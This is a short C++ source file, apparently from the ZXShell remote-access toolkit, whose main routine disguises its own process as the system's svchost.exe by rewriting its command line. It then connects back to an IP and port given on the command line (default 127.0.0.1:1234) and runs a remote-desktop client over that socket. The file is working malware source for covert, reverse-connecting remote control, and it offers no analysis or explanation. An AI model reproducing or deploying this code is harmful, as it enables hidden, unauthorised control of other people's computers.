#include "..\RunAs.cpp"
#include ".\rd_server.h"
#include "..\..\zxsCommon\ModifyCmdLine.cpp"

char * g_DllPath = NULL;

inline unsigned __int64 GetCycleCount() 
{ 
	__asm _emit 0x0F 
	__asm _emit 0x31
}

unsigned long MakeRand32(int i) 
{ 
	
	unsigned long j1,j2,s; 
	
	i = i << 15; 
	
	srand( (unsigned int)GetCycleCount() + i ); 
	
	j1 = rand(); 
	j2 = rand(); 
	
	j1 = j1 << 16; 
	
	s = j1+j2; 
	
	return s; 
} 


int __cdecl main(int argc, char **argv)
{
	char ip[100], fakepath[MAX_PATH];
	int port = 1234;

	if(argc == 2)
	{
		strcpy(ip, argv[1]);
	}else
	if(argc == 3)
	{
		strcpy(ip, argv[1]);
		port = atoi(argv[2]);
	}else
		strcpy(ip, "127.0.0.1");

	GetSystemDirectory(fakepath, MAX_PATH);
	strcat(fakepath, "\\svchost.exe");

	ModifyCmdLine(GetCurrentProcessId(), fakepath);

	InitSock();

	SOCKET Socket;

	Socket = ConnectHost(ip, port);

	rd_Client rdc(Socket);

	rdc.ProcessClient();

	closesocket(Socket);

	return 0;
}



